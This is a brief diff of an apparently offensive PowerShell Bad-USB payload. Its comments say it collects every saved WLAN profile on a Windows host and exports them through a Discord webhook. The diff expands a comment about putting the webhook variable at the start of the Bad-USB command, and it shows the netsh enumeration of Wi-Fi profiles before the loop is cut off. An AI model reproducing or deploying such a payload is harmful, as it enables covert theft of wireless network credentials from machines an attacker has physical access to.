@@ -1,5 +1,5 @@
 # This will look for all WLANs on a windows host and export via discord webhook.
-# Be sure to have the "$discord"
+# Be sure to have the "$discord" entered into beginning of the entered command in the Bad-USB
 
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value.Trim()
